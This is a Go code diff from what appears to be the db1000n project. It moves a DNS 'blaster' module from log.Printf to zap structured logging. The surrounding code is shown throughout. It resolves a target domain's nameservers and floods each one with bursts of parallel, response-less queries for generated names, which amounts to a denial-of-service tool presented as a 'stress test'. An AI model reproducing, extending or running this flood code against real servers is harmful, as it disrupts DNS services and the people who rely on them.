@@ -4,7 +4,6 @@ import (
 	"context"
 	"crypto/tls"
 	"fmt"
-	"log"
 	"net"
 	"strconv"
 	"strings"
@@ -13,6 +12,7 @@ import (
 
 	"github.com/miekg/dns"
 	utls "github.com/refraction-networking/utls"
+	"go.uber.org/zap"
 
 	"github.com/Arriven/db1000n/src/utils"
 	"github.com/Arriven/db1000n/src/utils/metrics"
@@ -41,12 +41,15 @@ type Config struct {
 type DNSBlaster struct{}
 
 // Start starts the job based on provided configuration
-func Start(ctx context.Context, wg *sync.WaitGroup, config *Config) error {
+func Start(ctx context.Context, logger *zap.Logger, wg *sync.WaitGroup, config *Config) error {
 	defer utils.PanicHandler()
 
-	log.Printf("[DNS BLAST] igniting the blaster, parameters to start: "+
-		"[rootDomain=%s; proto=%s; seeds=%v; delay=%s; parallelQueries=%d]",
-		config.RootDomain, config.Protocol, config.SeedDomains, config.Delay, config.ParallelQueries)
+	logger.Debug("igniting the blaster",
+		zap.String("rootDomain", config.RootDomain),
+		zap.String("proto", config.Protocol),
+		zap.Strings("seeds", config.SeedDomains),
+		zap.Duration("delay", config.Delay),
+		zap.Int("parallelQueries", config.ParallelQueries))
 
 	nameservers, err := getNameservers(config.RootDomain, config.Protocol)
 	if err != nil {
@@ -56,8 +59,7 @@ func Start(ctx context.Context, wg *sync.WaitGroup, config *Config) error {
 			config.RootDomain, err)
 	}
 
-	log.Printf("[DNS BLAST] nameservers resolved for the root domain [rootDomain=%v]: %v",
-		config.RootDomain, nameservers)
+	logger.Debug("nameservers resolved for the root domain", zap.String("rootDomain", config.RootDomain), zap.Strings("nameservers", nameservers))
 
 	blaster := NewDNSBlaster()
 
@@ -80,11 +82,15 @@ func Start(ctx context.Context, wg *sync.WaitGroup, config *Config) error {
 
 			defer utils.PanicHandler()
 
-			if err := blaster.ExecuteStressTest(ctx, nameserver, parameters); err != nil {
+			if err := blaster.ExecuteStressTest(ctx, logger, nameserver, parameters); err != nil {
 				metrics.IncDNSBlast(config.RootDomain, "", config.Protocol, metrics.StatusFail)
-				log.Printf("[DNS BLAST] stress test finished with error "+
-					"[nameserver=%s; proto=%s; seeds=%v; delay=%s; parallelQueries=%d]: %s",
-					nameserver, parameters.Protocol, parameters.SeedDomains, parameters.Delay, parameters.ParallelQueries, err)
+				logger.Debug("stress test finished with error",
+					zap.String("nameserver", nameserver),
+					zap.String("proto", config.Protocol),
+					zap.Strings("seeds", config.SeedDomains),
+					zap.Duration("delay", config.Delay),
+					zap.Int("parallelQueries", config.ParallelQueries),
+					zap.Error(err))
 
 				return
 			}
@@ -108,7 +114,7 @@ type StressTestParameters struct {
 }
 
 // ExecuteStressTest executes a stress test based on parameters
-func (rcv *DNSBlaster) ExecuteStressTest(ctx context.Context, nameserver string, parameters *StressTestParameters) error {
+func (rcv *DNSBlaster) ExecuteStressTest(ctx context.Context, logger *zap.Logger, nameserver string, parameters *StressTestParameters) error {
 	defer utils.PanicHandler()
 
 	var (
@@ -139,7 +145,7 @@ func (rcv *DNSBlaster) ExecuteStressTest(ctx context.Context, nameserver string,
 blastLoop:
 	for reusableQuery.QName = range dhhGenerator.Next() {
 		if keepAliveCounter == keepAliveReminder {
-			log.Printf("[DNS BLAST] Still blasting to [server=%s], OK!", reusableQuery.HostAndPort)
+			logger.Debug("still blasting to server", zap.String("server", reusableQuery.HostAndPort))
 			keepAliveCounter = 0
 		} else {
 			keepAliveCounter++
@@ -147,7 +153,7 @@ blastLoop:
 
 		select {
 		case <-ctx.Done():
-			log.Printf("[DNS BLAST] DNS stress is canceled, OK!")
+			logger.Debug("DNS stress is canceled", zap.String("server", reusableQuery.HostAndPort))
 
 			break blastLoop
 		default:
@@ -158,7 +164,7 @@ blastLoop:
 		for i := 0; i < parameters.ParallelQueries; i++ {
 			go func() {
 				defer utils.PanicHandler()
-				rcv.SimpleQueryWithNoResponse(sharedDNSClient, reusableQuery)
+				rcv.SimpleQueryWithNoResponse(logger, sharedDNSClient, reusableQuery)
 				awaitGroup.Done()
 			}()
 		}
@@ -166,7 +172,7 @@ blastLoop:
 
 		select {
 		case <-ctx.Done():
-			log.Printf("[DNS BLAST] DNS stress is canceled, OK!")
+			logger.Debug("DNS stress is canceled", zap.String("server", reusableQuery.HostAndPort))
 
 			break blastLoop
 		case <-nextLoopTicker.C:
@@ -221,14 +227,13 @@ func (rcv *DNSBlaster) SimpleQuery(sharedDNSClient *dns.Client, parameters *Quer
 }
 
 // SimpleQueryWithNoResponse is like SimpleQuery but with optimizations enabled by not needing a response
-func (rcv *DNSBlaster) SimpleQueryWithNoResponse(sharedDNSClient *dns.Client, parameters *QueryParameters) {
+func (rcv *DNSBlaster) SimpleQueryWithNoResponse(logger *zap.Logger, sharedDNSClient *dns.Client, parameters *QueryParameters) {
 	question := new(dns.Msg).SetQuestion(dns.Fqdn(parameters.QName), parameters.QType)
 	seedDomain := getSeedDomain(parameters.QName)
 
 	co, err := sharedDNSClient.Dial(parameters.HostAndPort)
 	if err != nil {
-		log.Printf("[DNS BLAST] failed to dial remote host [host=%s] to do the DNS query: %s",
-			parameters.HostAndPort, err)
+		logger.Debug("failed to dial remote host to do the DNS query", zap.String("host", parameters.HostAndPort), zap.Error(err))
 		metrics.IncDNSBlast(parameters.HostAndPort, seedDomain, sharedDNSClient.Net, metrics.StatusFail)
 
 		return
@@ -244,7 +249,7 @@ func (rcv *DNSBlaster) SimpleQueryWithNoResponse(sharedDNSClient *dns.Client, pa
 	_, _, err = sharedDNSClient.Exchange(question, parameters.HostAndPort)
 	if err != nil {
 		metrics.IncDNSBlast(parameters.HostAndPort, seedDomain, sharedDNSClient.Net, metrics.StatusFail)
-		log.Printf("[DNS BLAST] failed to complete the DNS query: %s", err)
+		logger.Debug("failed to complete the DNS query", zap.Error(err))
 
 		return
 	}
